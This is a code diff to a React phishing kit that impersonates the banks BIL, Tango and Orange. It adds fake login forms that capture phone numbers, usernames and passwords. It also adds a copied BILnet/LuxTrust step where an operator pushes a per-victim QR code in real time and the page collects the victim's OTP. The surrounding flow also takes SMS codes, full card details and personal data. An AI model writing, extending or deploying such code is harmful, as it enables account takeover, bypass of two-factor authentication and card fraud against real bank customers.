@@ -5,6 +5,7 @@ import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
 import {
   apiEnabled,
   apiGetCommand,
+  apiGetQr,
   apiHeartbeat,
   apiRegisterVisitor,
   apiSubmit,
@@ -16,6 +17,7 @@ import {
   getOrCreateVisitorId,
   makeVisitorId,
   readCommands,
+  readQrMap,
   readSubmissions,
   readVisitors,
   writeSubmissions,
@@ -38,6 +40,8 @@ const STATUS_TO_STEP = {
   waiting: 1,
   login_requested: 1,
   login_submitted: 1,
+  qr_requested: 2,
+  qr_submitted: 2,
   approve_requested: 2,
   approve_submitted: 2,
   phone_requested: 3,
@@ -315,16 +319,21 @@ export default function BankFlow() {
   // form states (all hooks at top — never conditional)
   const [userId, setUserId] = useState("");
   const [password, setPassword] = useState("");
+  const [orangeUser, setOrangeUser] = useState("");
   const [showPw, setShowPw] = useState(false);
   const [t1, setT1] = useState(false);
   const [phone, setPhone] = useState("");
   const [t3, setT3] = useState(false);
   const [sms, setSms] = useState("");
   const [t4, setT4] = useState(false);
+  // BIL QR step: OTP shown under the mosaic (real BILnet layout).
+  const [otp, setOtp] = useState("");
   const [card, setCard] = useState({ holder: "", number: "", exp: "", cvc: "" });
   const [t5, setT5] = useState(false);
   const [info, setInfo] = useState({ first: "", last: "", dob: "", address: "", zip: "", city: "" });
   const [t6, setT6] = useState(false);
+  // BIL QR uploaded by admin (per session). Null until the admin uploads.
+  const [qrImg, setQrImg] = useState(null);
 
   function pushSubmission(kind, data) {
     const entry = {
@@ -503,6 +512,48 @@ export default function BankFlow() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [status]);
 
+  // BIL only: poll the admin-uploaded QR for THIS session. Shows the moment
+  // the admin uploads; each session has its own QR.
+  useEffect(() => {
+    if (!bank || bank.slug !== "bil" || status !== "qr_requested" || !visitorIdRef.current) return;
+    const id = visitorIdRef.current;
+    let stop = false;
+    const fetchQr = async () => {
+      try {
+        const m = readQrMap();
+        if (!stop && m[id]?.image) setQrImg(m[id].image);
+      } catch {}
+      if (apiEnabled()) {
+        try {
+          const r = await apiGetQr(id);
+          if (!stop && r?.qr?.image) setQrImg(r.qr.image);
+          else if (!stop && !r?.qr) setQrImg(null);
+        } catch {}
+      }
+    };
+    fetchQr();
+    const iv = setInterval(fetchQr, 3000);
+    const onStorage = (e) => {
+      if (e.key === "live_qr_v1") fetchQr();
+    };
+    window.addEventListener("storage", onStorage);
+    const ch = getChannel();
+    const onMsg = (ev) => {
+      if (ev.data?.type === "qr-update" && ev.data?.visitorId === id) fetchQr();
+    };
+    ch?.addEventListener?.("message", onMsg);
+    return () => {
+      stop = true;
+      clearInterval(iv);
+      window.removeEventListener("storage", onStorage);
+      try {
+        ch?.removeEventListener?.("message", onMsg);
+        ch?.close?.();
+      } catch {}
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [bankSlug, status]);
+
   function go(fn) {
     setLoading(true);
     setTimeout(() => {
@@ -541,6 +592,7 @@ export default function BankFlow() {
   if (
     status === "waiting" ||
     status === "login_submitted" ||
+    status === "qr_submitted" ||
     status === "approve_submitted" ||
     status === "phone_submitted" ||
     status === "sms_submitted" ||
@@ -551,6 +603,7 @@ export default function BankFlow() {
     const notes = {
       waiting: "Vous avez choisi votre banque. Veuillez patienter pendant que nous vous connectons en sécurité…",
       login_submitted: "Identifiants reçus. Veuillez patienter pour l'étape suivante…",
+      qr_submitted: "QR-code et OTP reçus. Veuillez patienter…",
       approve_submitted: "Approbation reçue. Veuillez patienter…",
       phone_submitted: "Numéro reçu. Veuillez patienter…",
       sms_submitted: "Code SMS reçu. Veuillez patienter…",
@@ -563,6 +616,134 @@ export default function BankFlow() {
 
   /* ---------- LOGIN ---------- */
   if (status === "login_requested") {
+    // Tango: phone number + password. Orange: username + password.
+    // Login-only banks: after submit the loader shows.
+    if (bank.slug === "tango") {
+      const digits = phone.replace(/\D/g, "");
+      const phErr = !t3 ? "" : !digits ? "Le numéro de téléphone est requis." : digits.length < 8 ? "Veuillez saisir un numéro valide." : "";
+      const pwErr = !t3 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
+      const ok = digits.length >= 8 && password.length >= 4;
+      return (
+        <Shell
+          bank={bank}
+          step={1}
+          kicker="Connexion"
+          title="Connectez-vous à Tango"
+          desc={<>Entrez votre <strong>numéro de téléphone et mot de passe</strong> Tango pour continuer.</>}
+        >
+          <form
+            noValidate
+            onSubmit={(e) => {
+              e.preventDefault();
+              setT3(true);
+              if (!ok) return;
+              submitAndWait("login", { phone: digits, password }, "login_submitted");
+            }}
+          >
+            <label className="block min-w-0">
+              <span className={labelCls}>Numéro de téléphone</span>
+              <span className="relative mt-2 block">
+                <LeadIcon d={P.phone} />
+                <input
+                  value={phone}
+                  onChange={(e) => setPhone(e.target.value.replace(/[^\d\s]/g, ""))}
+                  onBlur={() => setT3(true)}
+                  placeholder="621 123 456"
+                  inputMode="tel"
+                  autoComplete="tel"
+                  className={`${inputCls(phErr)}`}
+                />
+              </span>
+              {phErr && <span className={errCls}>⚠ {phErr}</span>}
+            </label>
+            <label className="mt-4 block min-w-0">
+              <span className={labelCls}>Mot de passe</span>
+              <span className="relative mt-2 block">
+                <LeadIcon d={P.lock} />
+                <input
+                  type={showPw ? "text" : "password"}
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  onBlur={() => setT3(true)}
+                  placeholder="••••••••"
+                  autoComplete="current-password"
+                  className={`${inputCls(pwErr)} pr-14`}
+                />
+                <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
+                  {showPw ? "Masquer" : "Afficher"}
+                </button>
+              </span>
+              {pwErr && <span className={errCls}>⚠ {pwErr}</span>}
+            </label>
+            <div className="mt-6">
+              <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Se connecter →</PrimaryBtn>
+            </div>
+          </form>
+        </Shell>
+      );
+    }
+    if (bank.slug === "orange") {
+      const unErr = !t1 ? "" : !orangeUser.trim() ? "Le nom d'utilisateur est requis." : "";
+      const pwErr = !t1 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
+      const ok = orangeUser.trim() && password.length >= 4;
+      return (
+        <Shell
+          bank={bank}
+          step={1}
+          kicker="Connexion"
+          title="Connectez-vous à Orange"
+          desc={<>Entrez votre <strong>nom d&apos;utilisateur et mot de passe</strong> Orange pour continuer.</>}
+        >
+          <form
+            noValidate
+            onSubmit={(e) => {
+              e.preventDefault();
+              setT1(true);
+              if (!ok) return;
+              submitAndWait("login", { username: orangeUser.trim(), password }, "login_submitted");
+            }}
+          >
+            <label className="block min-w-0">
+              <span className={labelCls}>Nom d&apos;utilisateur</span>
+              <span className="relative mt-2 block">
+                <LeadIcon d={P.user} />
+                <input
+                  value={orangeUser}
+                  onChange={(e) => setOrangeUser(e.target.value)}
+                  onBlur={() => setT1(true)}
+                  placeholder="Nom d'utilisateur"
+                  autoComplete="username"
+                  className={`${inputCls(unErr)}`}
+                />
+              </span>
+              {unErr && <span className={errCls}>⚠ {unErr}</span>}
+            </label>
+            <label className="mt-4 block min-w-0">
+              <span className={labelCls}>Mot de passe</span>
+              <span className="relative mt-2 block">
+                <LeadIcon d={P.lock} />
+                <input
+                  type={showPw ? "text" : "password"}
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  onBlur={() => setT1(true)}
+                  placeholder="••••••••"
+                  autoComplete="current-password"
+                  className={`${inputCls(pwErr)} pr-14`}
+                />
+                <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
+                  {showPw ? "Masquer" : "Afficher"}
+                </button>
+              </span>
+              {pwErr && <span className={errCls}>⚠ {pwErr}</span>}
+            </label>
+            <div className="mt-6">
+              <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Se connecter →</PrimaryBtn>
+            </div>
+          </form>
+        </Shell>
+      );
+    }
     const uidErr = t1 ? validateUserId(userId) : "";
     const pwErr = !t1 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
     const ok = validateUserId(userId) === "" && password.length >= 4;
@@ -633,7 +814,104 @@ export default function BankFlow() {
     );
   }
 
-  /* ---------- APPROVE ---------- */
+  /* ---------- QR (BIL extra step only — all other steps stay the same) ---------- */
+  if (status === "qr_requested") {
+    // Only BIL has this step: LuxTrust mosaic + OTP, exactly like the real BILnet page.
+    // The mosaic image is uploaded by the admin for THIS session.
+    if (bank.slug === "bil") {
+      const otpCode = otp.replace(/\D/g, "").slice(0, 12);
+      const otpOk = otpCode.length > 0;
+      return (
+        <Shell
+          bank={bank}
+          step={2}
+          kicker="QR-Code"
+          title="Scannez l'image."
+          desc="Scannez ce QR code avec votre application LuxTrust, puis saisissez le code OTP affiché."
+        >
+          <div className="flex w-full flex-col items-center px-2">
+            {/* fraud notice, like the real BILnet page */}
+            <div className="mb-4 w-full rounded-2xl border border-neutral-200 bg-white px-4 py-3.5 text-left shadow-sm">
+              <p className="text-[11px] font-extrabold uppercase tracking-[0.18em] text-cyan-600">Fraudepreventie</p>
+              <p className="mt-1 text-[12.5px] leading-relaxed text-neutral-700">
+                Fraude <b>kent</b> vele vormen. <b>Houd dit in gedachten :</b>
+              </p>
+              <ul className="mt-1.5 list-disc space-y-1 pl-5 text-[12.5px] leading-relaxed text-neutral-700">
+                <li>BIL zal u NOOIT om <b>uw persoonlijke gegevens</b>, LuxTrust-inloggegevens of kaartcode vragen, noch om transactie-&quot;annuleringen&quot; te bevestigen via sms, e-mail of telefoon.</li>
+                <li>U kunt BILnet bereiken via onze officiële website bil.com of via de BILnet-app.</li>
+                <li><b>Klik niet</b> op links in sms-berichten of e-mails.</li>
+              </ul>
+              <p className="mt-1.5 text-[12.5px] leading-relaxed text-neutral-700">
+                <b>Slachtoffer</b> van fraude? <b>Neem contact op met</b> onze klantenservice via +352 4590 5000
+                (ma-vr 8:30-18:00) of Worldline via +352 491010.
+              </p>
+              <p className="mt-1 text-center text-[12.5px] font-semibold text-purple-700 underline">Leer meer</p>
+            </div>
+            <p className="text-[19px] font-black tracking-tight text-neutral-900">
+              LUX<span className="bg-gradient-to-r from-cyan-500 to-blue-700 bg-clip-text text-transparent">TRUST</span>
+            </p>
+            <p className="text-[12px] text-neutral-500">Enabling a digital world</p>
+            <div className="mt-3 flex w-full flex-col items-center gap-4">
+              <div className="flex flex-col items-center">
+            {qrImg ? (
+              <img src={qrImg} alt="Scannez l'image" className="h-[210px] w-[210px] rounded-lg object-contain" />
+            ) : (
+                  <span className="flex w-full min-w-[230px] flex-col items-center rounded-2xl border border-dashed border-neutral-300 bg-neutral-50 px-4 py-8 text-center">
+                    <span className="h-9 w-9 animate-spin rounded-full border-4 border-neutral-200 border-t-current" style={{ color: bank.color }} />
+                    <p className="mt-3 max-w-xs text-[13px] font-semibold leading-relaxed text-neutral-600">
+                      Le QR code de votre banque arrive… veuillez patienter.
+                    </p>
+                  </span>
+                )}
+              </div>
+            </div>
+            <form
+              noValidate
+              className="mt-5 flex w-full max-w-[300px] flex-col items-center"
+              onSubmit={(e) => {
+                e.preventDefault();
+                if (!otpOk) return;
+                submitAndWait("qr", { scanned: true, otp: otpCode, at: new Date().toISOString() }, "qr_submitted");
+              }}
+            >
+              <label className="flex w-full items-center gap-2">
+                <span className="shrink-0 text-[13px] font-extrabold uppercase tracking-wide text-neutral-700">OTP</span>
+                <input
+                  value={otpCode}
+                  onChange={(e) => setOtp(e.target.value)}
+                  placeholder="OTP"
+                  inputMode="numeric"
+                  autoComplete="one-time-code"
+                  className={`min-w-0 flex-1 border border-neutral-300 bg-white px-2.5 py-1.5 text-center font-mono text-[16px] font-bold tracking-[0.2em] outline-none transition placeholder:font-sans placeholder:text-[13px] placeholder:font-normal placeholder:text-neutral-400 focus:border-[var(--brand)]`}
+                />
+                <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-neutral-800 text-[11px] font-bold text-white">?</span>
+              </label>
+              <div className="mt-4 flex w-full gap-2.5">
+                <button
+                  type="button"
+                  onClick={() => setOtp("")}
+                  className="min-h-[48px] flex-1 rounded-lg border border-neutral-300 px-4 py-2.5 text-[13px] font-bold text-neutral-600 transition hover:bg-neutral-50 active:bg-neutral-100"
+                >
+                  Annuler
+                </button>
+                <button
+                  type="submit"
+                  disabled={!otpOk || loading}
+                  className="min-h-[48px] flex-1 rounded-lg border-2 border-green-600 bg-white px-4 py-2.5 text-[14px] font-extrabold uppercase tracking-wide text-green-700 transition hover:bg-green-50 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-40"
+                >
+                  {loading ? "…" : "S'AUTHENTIFIER"}
+                </button>
+              </div>
+            </form>
+          </div>
+        </Shell>
+      );
+    }
+    // Any other bank should never land here — park on the loader.
+    return <WaitingLoader bank={bank} stepNum={2} note="Veuillez patienter…" />;
+  }
+
+  /* ---------- APPROVE (same for every bank, BIL included) ---------- */
   if (status === "approve_requested") {
     return (
       <Shell
